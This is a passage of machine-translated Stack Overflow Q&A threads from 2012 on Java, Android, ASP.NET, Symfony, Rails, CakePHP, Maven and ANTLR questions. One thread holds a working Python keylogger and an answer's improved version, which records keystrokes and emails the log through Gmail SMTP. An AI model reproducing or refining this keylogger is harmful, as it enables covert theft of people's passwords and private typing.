rendered="#{not empty facesContext.getMessageList(null)} 
```

代替：

```
rendered="#{not empty facesContext.messageList(null)}" 
```

在丹尼尔的回答中。

或者这个：

```
rendered="#{not empty facesContext.getMessageList('inputForm')} 
```

其中'inputForm'是：

```
<h:form id="inputForm">
...
</h:form> 
```

如果您只想将其发送到页面上的几种形式中的一种。

# java - 如何过滤 JAX-RS 服务的响应？

> ID：11736643
> 
> 赞同：0
> 
> 时间：2012-07-31T09:06:33.230
> 
> 标签：java, jax-rs

我得到了以下值对象：

```
@XmlRootElement
public class Movie{
  public String name;
  public Date releaseDate;
  public List<Actors> actors;
} 
```

我得到了以下服务

```
@GET
@Produces(MediaType.APPLICATION_JSON)
public List<Movie> moviesByYear(int year){
//return all movies by year
} 
```

通过一些 ORM 框架在数据库中搜索电影。我的问题是：我想过滤响应，不返回演员列表（因为这个字段不相关，并且使响应变大）。当然，我可以

```
for(Movie movie: movies){
  movie.actors = null;
} 
```

但如果我想删除多个字段，这将迅速升级。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:16:20.270

如果您不想`actors`在回复中包含该字段，您可以使用 注释该字段`@XmlTransient`。有关更多详细信息，请参阅[JavaDoc](http://docs.oracle.com/javase/7/docs/api/javax/xml/bind/annotation/XmlTransient.html)。

否则，您可以将`Movie`对象包装到不公开该`actors`字段的包装器对象中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:12:03.337

如果服务没有执行此操作的方法，则您必须更改服务代码本身。

# blackberry-webworks - 无法使用 phon2 gap 技术在黑莓的非触摸设备中滚动列表

> ID：11736650
> 
> 赞同：1
> 
> 时间：2012-07-31T09:07:08.653
> 
> 标签：blackberry-webworks

我无法滚动列表。我正在使用此代码，请给我一些建议。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Departure Schedule</title>
    <link href="style/style.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript" src="script/common.js"></script>
    <script type="text/javascript" src="script/soapclient.js"></script> 
    <script type="text/javascript" src="script/jquery.min.js"></script> 
    <script type="text/javascript">

        function GetDepartureStationDashboard()
        {      
             var pl = new SOAPClientParameters();
             var params = getParams();
             var parameter1 = unescape(params["getStationCode"]);
             var parameter2 = unescape(params["getStationDesc"]).replace(/[+]/g,"  ");
             document.getElementById("headingcontent").innerHTML = parameter2;
             pl.add("parameter1", parameter1);
             SOAPClient.invoke(WSDLURL, "GetDepartureStationDashboard", pl, true,  GetDepartureStationDashboard_callBack);
        }
        function GetDepartureStationDashboard_callBack(r)
        { 

// list which i want to scroll
            alert(r);// web service data
            var listdata = ""; 
            //tabledata += "<ul x-blackberry-focusable=\"true\">";
            //alert(""+r[0].stationName);
            for (var i = 0; i < r.length-1; i++)
            {
              //    
                listdata += "<li x-blackberry-focusable=\"true\"  id=\"i\"  x-blackberry-onUp=\"scroll(r.length-1)\" x-blackberry-onDown=\"scroll(r.length-1)\">" + r[i].stationName + "</li>";     
            }
            //listdata += "</ul>";
            alert(listdata);
            document.getElementById("iscroller").innerHTML = listdata;
        }

    </script>
</head>
<body onload="GetDepartureStationDashboard()">
<div id="wrapper">
  <div class="login_cont" x-blackberry-focusable="true">
    <div class="home_icon"><a href="index.html"><img src="images/back-icon.png" alt="Home" title="Home" x-blackberry-focusable="true"/></a></div>
    <h1 class="fr">Departures</h1>
    <div class="cl"></div>
      <div class="mid_cont">
        <div class="grid_cont">
          <div class="heading_bar">
            <h1 class="fl" id="headingcontent"></h1>
            <input name="" type="button" class="heading_btn fr" value="Change" onclick="location.href='index.html'" x-blackberry-focusable="true"/>
            <div class="cl"></div>
          </div>
          <div>
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                    <td width="30%">PLATFORM NO.</td><td width="30%">STD - ETD</td><td width="35%">Destination</td><td width="5%">STATUS</td>
                </tr>
            </table>
          </div>
          <div class="scroll-pane">

              <ul id = "iscroller" x-blackberry-focusable="true">
              </ul>

        </div>
        <div class="grid_error"><img src="images/help-icon.png" /> Departure Schedule</div>
      </div>
    </div>
  </div>
</div>
<input type="hidden" name="hdnStationName" id="hdnStationName" value="" />
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T18:48:13.367

我建议如下：

1.  确保没有发生运行时错误。我在您的代码中没有看到任何`try-catch`语句，因此如果任何 JavaScript 行失败，它可能会影响整个应用程序。
2.  我看到对`iScroll`. 该库不能保证在 BlackBerry 上工作（它是为另一个平台设计的），尤其是在某些设备上，因为它与 BlackBerry Web 引擎的自然动态滚动冲突。如果您确实遇到了您认为源于 iScroll 的问题，请向开发人员[报告](http://cubiq.org/iscroll)。
3.  如果您使用的是 BlackBerry 7，则可以使用远程 Web 检查器来调试和分析实时内容。[这种技术](https://developer.blackberry.com/html5/documentation/web_inspector_overview_1553586_11.html)可以帮助您找到问题的根源。

# java - 像pinterest这样的Android异构gridview？

> ID：11736658
> 
> 赞同：57
> 
> 时间：2012-07-31T09:07:31.170
> 
> 标签：java, android, pinterest

是否可以使用在 Android 上创建类似 pinterest 的布局`GridView`？我想使用创建图片库，`GridView`但我不确定它是否是好的解决方案。我不想创建三个`LinearLayouts`（我认为这个解决方案不好：[Pinterest style listview or gridview in android](https://stackoverflow.com/questions/9897808/pinterest-style-listview-or-gridview-in-android)）

有任何想法吗 ;）？

![在此处输入图像描述](../Images/5aae1607ef6c11278d44ccf93345ca26.png)

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-21T08:32:23.200

我也一直在玩这个（使用LinearLayout），但最后我在内存消耗方面遇到了很多问题（特别是当我不得不重新加载项目时）。**我选择了使用两个同步ListViews**的简单解决方案。这样我可以利用内部**缓存**，这很有帮助。为此，我必须使用同步列表的**OnTouchListener**和**OnScrollListener 。**这是一个例子：

[https://github.com/vladexogija/PinterestListView](https://github.com/vladexologija/PinterestListView)

![在此处输入图像描述](../Images/d30ad86e1987d5891d55c8fa295dece0.png)

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-07-31T09:12:11.353

创建布局如下

```
<ScrollView...>
<LinearLayout....
   android:id="@+id/linear1"
   orientation="horizontal">

   <LinearLayout....
     android:id="@+id/linear2"
     android:layout_weight="0.33"
     orientation="vertical">

   <LinearLayout....
     android:id="@+id/linear3"
     android:layout_weight="0.33"
     orientation="vertical">

   <LinearLayout....
     android:layout_weight="0.33"
     orientation="vertical">

</LinearLayout>
</ScrollView> 
```

现在`ImageView`在布局中动态添加

```
linear1 = (LinearLayout) findViewById(R.id.linear1);
linear2 = (LinearLayout) findViewById(R.id.linear2);
linear3 = (LinearLayout) findViewById(R.id.linear3);

for(int i=0;i<n;i++)
{
   ImageView iv = new ImageView(this);
   iv.setImageResource(R.id.icon);

   int j = count % 3;  <---- 
   if(j==0)
       linear1.addView(iv);
   else if(j==1)
       linear2.addView(iv);
   else
       linear3.addView(iv); 
} 
```

**输出：**

![在此处输入图像描述](../Images/d42f60b89fa287b32646f9e019490b5e.png)

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2013-09-18T10:18:51.937

一些用于实现类似 Pinterest 的网格视图的有用库：

*   [https://github.com/maurycyw/StaggeredGridViewDemo](https://github.com/maurycyw/StaggeredGridViewDemo)
*   [https://github.com/jacobmoncur/QuiltViewLibrary](https://github.com/jacobmoncur/QuiltViewLibrary)
*   [https://github.com/huewu/PinterestLikeAdapterView](https://github.com/huewu/PinterestLikeAdapterView)
*   [https://github.com/vladexogija/PinterestListView](https://github.com/vladexologija/PinterestListView)
*   [https://github.com/expilu/AntipodalWall](https://github.com/expilu/AntipodalWall)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2015-05-13T07:00:57.033

对于这个问题的最近访问者，我建议使用`RecyclerView` with `StaggedGridLayoutManager`。它具有足够的功能和灵活性。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2013-01-24T10:05:53.593

用于同步滚动 2 个 ListView 的独立助手：[https ://gist.github.com/yanchenko/6179793](https://gist.github.com/yanchenko/6179793)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2013-08-09T03:29:08.953

我正在使用这个库：[https](https://github.com/huewu/PinterestLikeAdapterView) ://github.com/huewu/PinterestLikeAdapterView 。

它工作得很好。我唯一的问题是`setOnItemClickListener`and`setOnItemLongClickListener`有点错误，所以我直接在 convertView 上设置了侦听器。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-01-03T13:03:51.673

该库来自 Etsy 应用程序： [https ://github.com/etsy/AndroidStaggeredGrid](https://github.com/etsy/AndroidStaggeredGrid)

# c# - 从 ListBox 中的 ListItem 获取值而不是文本

> ID：11736661
> 
> 赞同：0
> 
> 时间：2012-07-31T09:07:49.247
> 
> 标签：c#, asp.net

我有这个代码

```
 protected void btnPrasaj_Click(object sender, EventArgs e)
{
    List<ListItem> lista = new List<ListItem>();
    string prasanje = null;
    Application.Lock();
    if (Application["prasanja"] == null) // za prvpat se postavuva prasanje
    {
        prasanje = txtNaslov.Text + "\n\n\n" + txtPrasanje.Text;
        lista.Add(new ListItem(prasanje, ddltema.SelectedIndex.ToString()));
        lstProblemPrasanje.DataSource = lista;
        lstProblemPrasanje.DataTextField = "Text";
        lstProblemPrasanje.DataValueField = "Value";
        lstProblemPrasanje.DataBind();
        Application["prasanja"] = lista;
    }
    else
    {
        lista=(List<ListItem>)Application["prasanja"];
        prasanje = txtNaslov.Text + "\n\n\n" + txtPrasanje.Text;
        lista.Add(new ListItem(prasanje, ddltema.SelectedIndex.ToString()));
        lstProblemPrasanje.DataSource = lista;
        lstProblemPrasanje.DataTextField = "Text";
        lstProblemPrasanje.DataValueField = "Value";
        lstProblemPrasanje.DataBind();
        Application["prasanja"] = lista;
    }
    Application.UnLock();
} 
```

当我在 ListBox 中单击此按钮时，我得到数字（这是项目的值）而不是文本字段的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:15:49.737

由于您的数据源是 ListItems 列表，因此您不必指定 DataTextField 和 DataValueField。只需注释掉以下几行。

```
lstProblemPrasanje.DataTextField = "Text";
lstProblemPrasanje.DataValueField = "Value"; 
```

所以你的代码应该是：

```
protected void btnPrasaj_Click(object sender, EventArgs e)
{
    List<ListItem> lista = new List<ListItem>();
    string prasanje = null;
    Application.Lock();
    if (Application["prasanja"] == null) // za prvpat se postavuva prasanje
    {
        prasanje = txtNaslov.Text + "\n\n\n" + txtPrasanje.Text;
        lista.Add(new ListItem(prasanje, ddltema.SelectedIndex.ToString()));
        lstProblemPrasanje.DataSource = lista;
        //lstProblemPrasanje.DataTextField = "Text";
        //lstProblemPrasanje.DataValueField = "Value";
        lstProblemPrasanje.DataBind();
        Application["prasanja"] = lista;
    }
    else
    {
        lista=(List<ListItem>)Application["prasanja"];
        prasanje = txtNaslov.Text + "\n\n\n" + txtPrasanje.Text;
        lista.Add(new ListItem(prasanje, ddltema.SelectedIndex.ToString()));
        lstProblemPrasanje.DataSource = lista;
        //lstProblemPrasanje.DataTextField = "Text";
        //lstProblemPrasanje.DataValueField = "Value";
        lstProblemPrasanje.DataBind();
        Application["prasanja"] = lista;
    }
    Application.UnLock();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:20:47.793

对于此类数据源项，您不需要明确指定`DataText`和字段，还可以通过以下方式删除重复部分来简化代码：`DataValue``if/else`

```
protected void btnPrasaj_Click(object sender, EventArgs e)
{
    string key = "prasanja";
    List<ListItem> lista = new List<ListItem>();
    string prasanje = null;
    Application.Lock();
    if (Application[key] != null) // za prvpat se postavuva prasanje
    {
        lista = (List<ListItem>)Application[key];
    }

    prasanje = txtNaslov.Text + "\n\n\n" + txtPrasanje.Text;
    lista.Add(new ListItem(prasanje, ddltema.SelectedIndex.ToString()));
    lstProblemPrasanje.DataSource = lista;
    lstProblemPrasanje.DataBind();
    Application[key] = lista;
    Application.UnLock();
} 
```

# facebook - 检查身份验证对话框上的跳出率

> ID：11736662
> 
> 赞同：-1
> 
> 时间：2012-07-31T09:07:51.220
> 
> 标签：facebook, authentication, dialog, analytics

我知道曾经有一种方法可以检查使用 Facebook Connect 在网站上打开身份验证对话框然后在未经授权的情况下取消的用户的跳出率。这似乎已从 App Insights 转移。这仍然可用吗？如果可以，在哪里可以找到它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T10:35:12.130

*您可以在应用程序仪表板的Insights -> Users -> Growth*下找到有关通过 Auth 对话框单击的用户数量的信息，如以下屏幕截图所示：

![显示洞察 -> 用户 -> 增长面板的应用程序仪表板屏幕截图](../Images/6772d3e3212344b05d0113cd85f53211.png)

在那里，您还可以看到有多少用户要求和接受了哪种权限组合——它有总印象数、点击率、总接受数的统计信息（页面下方，未在屏幕截图中显示）。

# symfony - EC2 负载均衡器背后的 Symfony2 HTTPS 要求

> ID：11736664
> 
> 赞同：9
> 
> 时间：2012-07-31T09:07:55.167
> 
> 标签：symfony, amazon-ec2

当在处理 SSL 连接并将其作为 HTTP 发送给您的 EC2 负载均衡器后面时，什么是确保在 Symfony2 中使用 HTTPS 的干净的 Symfony 方式。

如果您执行诸如 requires_channel 之类的操作，则在初始更改为 HTTPS 后会出现重定向循环，因为在网络服务器本身上您仍在执行 HTTP。不过，该 url 确实显示了 HTTPS，并且亚马逊也提供了一个 X-FORWARDED-PROTO 标头以供使用。

有没有一种干净的方式让 symfony2 处理这种情况？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T09:23:02.153

您应该检查[此方法](https://github.com/symfony/HttpFoundation/blob/master/Request.php#L447)是否适合您。

在你`app.php`之前`$kernel->handle(...);`你应该设置：

```
Request::trustProxyData(); 
```

**更新：**

您还可以在`config.yml`（请参阅[doc](http://symfony.com/doc/current/reference/configuration/framework.html#trust-proxy-headers)）中配置您的应用程序：

```
framework:
    ...
    trust-proxy-headers: true 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-09-15T08:07:10.570

在 Symfony 3.3 中删除了trusted_proxies 选项。请参阅[如何将 Symfony 配置为在负载均衡器或反向代理之后工作](http://symfony.com/doc/current/request/load_balancer_reverse_proxy.html)。

# asp.net - 如何获得 .NET 4.0？

> ID：11736669
> 
> 赞同：1
> 
> 时间：2012-07-31T09:08:07.443
> 
> 标签：asp.net, .net, iis

我查找了 Microsoft .NET 4.0 并下载了 2 个东西。Web 安装程序和客户端配置文件，但根据这张图片的底部，我没有。

![错误截图](../Images/a8d3c97c1ad1727ae419e44ead47287c.png)

错误信息是：

> 无法加载文件或程序集`App_Code`或依赖项之一。此程序集由比当前加载的运行时更新的运行时构建，并且无法加载。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:11:24.180

您是否通过 IIS 检查了应用程序池的**“.NET Framework 版本”列的值？**

![应用程序池配置](../Images/36501792dac6327adb4ab50f7fab5d44.png)

要改变这一点：

1.  打开 IIS 单击您在应用程序左侧看到的树结构中的“应用程序池”级别
2.  右键单击列表中的应用程序池，然后选择“基本设置”
3.  将“网络框架版本”的值更改为 v4.0
4.  按“确定”以应用更改，应用程序池将回收以供使用

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:12:28.197

An existing web application will continue to run .net 2.0 since the frameworks are installed side-by-side. You have to explicitly configure the app pool to run 4.0.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:11:22.230

确保您在 IIS 中的应用程序池（我假设您使用的是 IIS）设置为 .NET 4.0（默认情况下它自己设置为 2.0）。如果您无法始终尝试使用 IIS 重新注册 .NET：

1.  打开命令提示符
2.  输入以下内容：C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regiis.exe -i
3.  按回车

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T09:21:21.080

第一种[解决方案](https://stackoverflow.com/questions/10607095/this-assembly-is-built-by-a-runtime-newer-than-the-currently-loaded-runtime-and)。

第二个[解决方案](https://stackoverflow.com/questions/5138735/error-this-assembly-is-built-by-a-runtime-newer-than-the-currently-loaded-runti)

并确保您的 IIS 应用程序池设置为 .NET 4.0，以获取有关此方面的帮助。检查此。

[MSDN 帮助](http://msdn.microsoft.com/en-us/library/dd483478.aspx)

# java - 媒体播放器均衡器

> ID：11736671
> 
> 赞同：0
> 
> 时间：2012-07-31T09:08:20.570
> 
> 标签：java, android

我正在开发一个 android 媒体播放器应用程序。谁能告诉我如何将预设值分配给歌曲并播放。

你能给我解决方案吗？

下面是正在使用的代码，

```
equalizer = new Equalizer(1, audioSessionId);
        equalizer.setEnabled(true);
        equalizer.usePreset(preset); 
```

# python - 记录和清除文件

> ID：11736672
> 
> 赞同：2
> 
> 时间：2012-07-31T09:08:21.303
> 
> 标签：python, logging, keylogger

我正在研究简单的键盘记录器-

```
import logging, sys, smtplib, pyHook, pythoncom, socket
path = r"C:\Users\Karel\Desktop\log.txt"
logging.basicConfig(filename=path, level=logging.DEBUG, format="%(message)s")
server = smtplib.SMTP("smtp.gmail.com:587")
server.starttls()
server.login("xxx","xxx")

def OnKeyboardEvent(event):

    print "Key: ", chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    checklog()
    return True

def checklog():
    f = open(path, "r")
    x = f.read()
    if len(x) == 1000:
        server.sendmail("xxx@gmail.com", "xxxn@gmail.com", x)
        f.close()
        f = open(path,"w")
        f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages() 
```

它应该将日志保存到文件并在文件长度为 1000 时发送到电子邮件。然后清除日志，当长度为 1000 时再次发送邮件等。但是此代码不起作用，文件以 1000 发送，已清除，但不再记录. 问题出在哪里？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:43:47.013

类似于以下内容。不过，请仔细考虑一下为什么您需要一个键盘记录器。这是未经测试的。

```
from functools import partial
import logging
import logging.handlers
import smtplib
import pyHook
import pythoncom

class EmailingRotatingFileHandler(logging.handlers.RotatingFileHandler):
    def __init__(self, smtp_credentials, **kargs):
        self.smtp_credentials = smtp_credentials
        super(EmailingRotatingFileHandler, self).__init__(**kargs)

    def smtp_connect(self):
        server = smtplib.SMTP("smtp.gmail.com:587")
        server.starttls()
        server.login("", "")
        return server

    def doRollover(self):
        ## Close the stream
        if self.stream:
            self.stream.close()
            self.stream = None

        ## Email the file
        server = self.smtp_connect()

        with open(self.baseFilename, 'r') as logfile:
            contents = logfile.read()
            server.sendmail(self.smtp_credentials[0], self.smtp_credentials[1], contents)

        server.quit()

        ## Proceed with the rollover
        super(EmailingRotatingFileHandler, self).doRollover()

def OnKeyboardEvent(logger, event):
    print "Key: ", chr(event.Ascii)
    logger.info(chr(event.Ascii))
    return True

def main():
    path = r"C:\Users\Karel\Desktop\log.txt"
    smtp_credentials = ("", "")

    ## Set up the logging
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    log_handler = EmailingRotatingFileHandler(smtp_credentials, path, maxBytes=1024)
    formatter = logging.Formatter('%(message)s')
    log_handler.setFormatter(formatter)
    logger.addHandler(log_handler)

    ## Configure the event handlers
    hm = pyHook.HookManager()
    hm.KeyDown = partial(OnKeyboardEvent, logger)
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main() 
```

# ruby-on-rails - 没有 ID 找不到声音 - 卡住 Ruby On Rails

> ID：11736673
> 
> 赞同：0
> 
> 时间：2012-07-31T09:08:23.990
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我是 Rails 的初学者，我实际上显然是被一个“初学者问题”困住了。

我有一个“声音”脚手架控制器，我必须添加一个动作“sendit”。我无法访问从我的视图到我的控制器的声音。

这是我尝试访问**“ [http://127.0.0.1:3000/sounds/sendit.14](http://127.0.0.1:3000/sounds/sendit.14)** ”时的错误（为什么它是 sendit.14 而不是sounds/sendit/14 或sounds/14/sendit？）

```
ActiveRecord::RecordNotFound in SoundsController#sendit

Couldn't find Sound without an ID

Application Trace | Framework Trace | Full Trace
app/controllers/sounds_controller.rb:74:in `sendit'
Request

Parameters:

{"format"=>"14"} 
```

这是我的代码：

**声音控制器：**

```
def sendit
    @sound = Sound.find(params[:id]) # ----- Error is on this line -----
    # Do Job
  end 
```

**索引.html.erb**

```
<% @sounds.each do |sound| %>
  <% if sound.user_id == current_user.id %>
    <tr>
      <td><%= sound.title %></td>
      <td><%= sound.user.email %></td>
      <td><%= link_to 'Show', sound %></td>
      <td><%= link_to 'Edit', edit_sound_path(sound) %></td>
      <td><%= link_to 'Destroy', sound, method: :delete, data: { confirm: 'Are you sure?' } %></td>
      <td><%= link_to 'Send', sounds_sendit_path(sound) %></td> 
```

**路线.rb**

```
 devise_for :users

  match "/sounds/sendit/", :controller => "sounds", :action => "sendit"

  resources :users, :sounds 
```

我在路由文件中这样做是因为[向现有控制器添加操作（Ruby on Rails）](https://stackoverflow.com/questions/401241/adding-an-action-to-an-existing-controller-ruby-on-rails)

当我做**rake routes**时，这是输出：

```
 [...]
           sounds_sendit        /sounds/sendit(.:format)       sounds#sendit 
                   users GET    /users(.:format)               users#index
                         POST   /users(.:format)               users#create
                new_user GET    /users/new(.:format)           users#new
               edit_user GET    /users/:id/edit(.:format)      users#edit
                    user GET    /users/:id(.:format)           users#show
                         PUT    /users/:id(.:format)           users#update
                         DELETE /users/:id(.:format)           users#destroy
                  sounds GET    /sounds(.:format)              sounds#index
                         POST   /sounds(.:format)              sounds#create
               new_sound GET    /sounds/new(.:format)          sounds#new
              edit_sound GET    /sounds/:id/edit(.:format)     sounds#edit
                   sound GET    /sounds/:id(.:format)          sounds#show
                         PUT    /sounds/:id(.:format)          sounds#update
                         DELETE /sounds/:id(.:format)          sounds#destroy
                    root        /                              home#index 
```

（我其实不明白第一行，为什么没有POST / GET，为什么是sounds_sendit 和没有sendit_sound 像其他默认操作？如何解决？）

感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:14:06.577

因为您没有以 id 作为参数的操作的路线，所以 rails 假定 id 是格式您必须为此创建路线

```
resources :sounds do
  post :sendit, on: :member
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:16:31.600

而不是这个：

```
match "/sounds/sendit/", :controller => "sounds", :action => "sendit" 
```

用这个：

```
 resources :sounds do
    member do
      get :sendit
    end
  end 
```

然后您将能够使用`sendit_sound_path`帮助程序正确链接到操作：

```
link_to "link text", sendit_sound_path(sound_object) 
```

希望这对你有用，...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T09:14:18.437

您应该在您的路线中定义 id 参数，请参见[此处](http://guides.rubyonrails.org/routing.html)。

```
match "/sounds/:id/sendit/", :controller => "sounds", :action => "sendit" 
```

您可以使用“as”选项命名您的路线。来自上述网站的示例：

```
match 'exit' => 'sessions#destroy', :as => :logout 
```

如果你只想要一个 get，那么你可以使用 get 而不是 match。一个例子：

任何一个：

```
match 'photos/show' => 'photos#show', :via => :get 
```

或更短：

```
get 'photos/show' 
```

# cakephp - 在 cakephp 2.1 上使用 JsHelper 添加评论表单

> ID：11736677
> 
> 赞同：1
> 
> 时间：2012-07-31T09:08:43.483
> 
> 标签：cakephp, cakephp-2.1

尝试在 cakephp 2.1 上使用 JsHelper 创建评论提交表单时遇到了一些麻烦。我想做一个评论系统，就像你在 facebook 上的一样。这是我的代码：

我的应用控制器

```
class AppController extends Controller {
public $helpers = array('Html', 'Form', 'Js' => array('jquery'));
public $components = array('RequestHandler');
} 
```

我的评论控制器

```
class CommentsController extends AppController {
public function index() {
    debug($this->RequestHandler);
    $this->set('comments', $this->Comment->find('all'));
    if (!empty($this->request->data)) {
        if ($this->Comment->save($this->request->data)) {
            if ($this->RequestHandler->isAjax()) {
                // Handle Ajax
                $this->render('success', 'ajax');
            }else {
                //$this->Session->setFlash('Comment added');
                $this->redirect(array('action' => 'index'));
            }
        }
    }
} 
```

我的评论模型

```
class Comment extends AppModel {
public $name = 'Comment';

public $validate = array(
    'name' => array(
        'rule' => 'NotEmpty',
        'message' => 'Enter your name.'
        ),
    'email' => array(
        'rule' => 'email',
        'message' => 'Please supply a valid email address.'
        ),
    'content' => array(
        'rule' => 'NotEmpty',
        'message' => 'This field cannot be left blank.'
        )
    );
} 
```

我的索引视图

```
<table>
<tr>
    <th>Id</th>
    <th>Name</th>
    <th>Email</th>
    <th>Content</th>
</tr>
<?php foreach ($comments as $k => $v): ?>
<tr>
    <td><?php echo $v['Comment']['id']; ?></td>
    <td><?php echo $v['Comment']['name']; ?></td>
    <td><?php echo $v['Comment']['email']; ?></td>
    <td><?php echo $v['Comment']['content']; ?></td>
</tr>
<?php endforeach; ?>
</table>

<div class="page-header">
  <h1>Add a comment</h1>
</div>

<div id="success"></div>
<div>

<?php $data = $this->Js->get('#CommentIndexForm')->serializeForm(array('isForm' => true, 'inline' => true));
$this->Js->get('#CommentIndexForm')->event(
      'submit',
      $this->Js->request(
        array('action' => 'save'),
        array(
                'update' => '#success',
                'data' => $data,
                'async' => true,    
                'dataExpression'=>true,
                'method' => 'POST'
            )
        )
    );
 ?>

 <?php 
 echo $this->Form->create('Comment', array('action' => 'index', 'default'=>false));
 echo $this->Form->input('name', array('id' => 'name'));
 echo $this->Form->input('email', array('id' => 'email'));
 echo $this->Form->input('content', array('id' => 'content'));
 echo $this->Form->end(__('Submit'));
 echo $this->Js->writeBuffer();

 ?>
 </div>
  <div id="sending" style='display:none;background-color:lightgreen;'>
  Sending ...
  </div> 
```

有人有想法吗？

# php - php：如何找到计数结果为1表示一个元素或不可数？

> ID：11736679
> 
> 赞同：1
> 
> 时间：2012-07-31T09:08:45.393
> 
> 标签：php, arrays

如果一个数组只有一个元素，则计数结果为1。如果数组不可数，结果也是1。那么，如何知道它是一个元素还是不可数？ **编辑** php menue：如果 var 不是数组或实现了 Countable 接口的对象，则返回 1。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:21:00.317

来自 PHP 手册：[http ://www.php.net/manual/en/function.count.php](http://www.php.net/manual/en/function.count.php)

> 返回 var 中的元素个数。如果 var 不是数组或实现了 Countable 接口的对象，则返回 1。有一个例外，如果 var 为 NULL，则返回 0。

你可以试试这个

```
if (!method_exists($someVar, 'count') && !(is_array($someVar))) {
    echo 'cannot count';
}
else {
    echo count($someVar);
} 
```

这应该适用于数组、对象和简单变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:11:48.863

“不可数”是指“不是数组/对象”？

如果使用 phps is_array() 和 is_object() 进行测试，请参阅： http: [//php.net/manual/en/function.is-array.php](http://php.net/manual/en/function.is-array.php)

如果您引用未实现可数模式的特制数组或对象，那么通常是有原因的。很可能计算该结构中的元素是没有意义的。在这种情况下，首先使用 method_exists($your_obj,'count') 检查数组是否可数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:12:06.063

您可以使用[is_array](http://php.net/manual/en/function.is-array.php)函数来检查变量是数组还是其他东西。

```
is_array($array) 
```

# git - 带有 git 的 Maven 发布插件，如果在处理过程中推送提交，则会出错

> ID：11736680
> 
> 赞同：8
> 
> 时间：2012-07-31T09:08:50.617
> 
> 标签：git, maven, release, maven-3, maven-release-plugin

我们使用 git 存储库和 maven 发布插件。在第一个构建步骤中，我们将所有更改提取到本地存储库，然后在下一个构建步骤中运行`mvn release:prepare release:perform`. `release:prepare`更新工作区，更新 pom 文件中的版本，在存储库中创建标签，运行所有测试，构建 jar 等。如果没问题，它会将本地存储库更改推送到远程（更新的 pom 和创建的标签）。

问题是当有人同时推送一些更改时，从 Maven 推送失败。错误信息是：

```
error: failed to push some refs to 'http://<my_repository>'
To prevent you from losing history, non-fast-forward updates were rejected
Merge the remote changes before pushing again.  See the 'Note about
fast-forwards' section of 'git push --help' for details. 
```

有人有类似的问题吗？如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T21:29:10.370

看看[pushChanges](http://maven.apache.org/maven-release/maven-release-plugin/prepare-mojo.html#pushChanges)：

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-release-plugin</artifactId>
    <configuration>
        <pushChanges>false</pushChanges>
    </configuration>
</plugin> 
```

...稍后再推

# java - Java 中生成的 Antlr 解析器：并非所有输入都被读取

> ID：11736681
> 
> 赞同：0
> 
> 时间：2012-07-31T09:08:52.280
> 
> 标签：java, antlr, antlr3

我正在研究我的 Antlr 语法，以使用 Java 解析多个变量中的多项式函数。合法输入的例子是

```
42; X; +42X; Y^42; 1337HelloWorld; 13,37X^42; 
```

以下语法在编译时不会出现警告或错误：

```
grammar Function;

parseFunction returns [java.util.List<java.util.List<Object>> list] :   
    { list = new java.util.ArrayList(); }                                              ( f=functionPart { list.add($f.list); } )+
|   { list = new java.util.ArrayList(); } ( fb=functionBegin ) { list.add($fb.list); } ( f=functionPart { list.add($f.list); } )*
;

functionBegin returns [java.util.List<Object> list]:
m=NUMBER v=VARIABLE e=exponent  { list = new java.util.ArrayList(); list.add("+"); list.add($m.text); list.add($v.text); list.add($e.value); }
| m=NUMBER v=VARIABLE           { list = new java.util.ArrayList(); list.add("+"); list.add($m.text); list.add($v.text); }
| v=VARIABLE e=exponent         { list = new java.util.ArrayList(); list.add("+"); list.add("1");     list.add($v.text); list.add($e.value); }  
| v=VARIABLE                    { list = new java.util.ArrayList(); list.add("+"); list.add("1");     list.add($v.text); }
| m=NUMBER                      { list = new java.util.ArrayList(); list.add("+"); list.add($m.text); }
;

functionPart returns [java.util.List<Object> list] :    
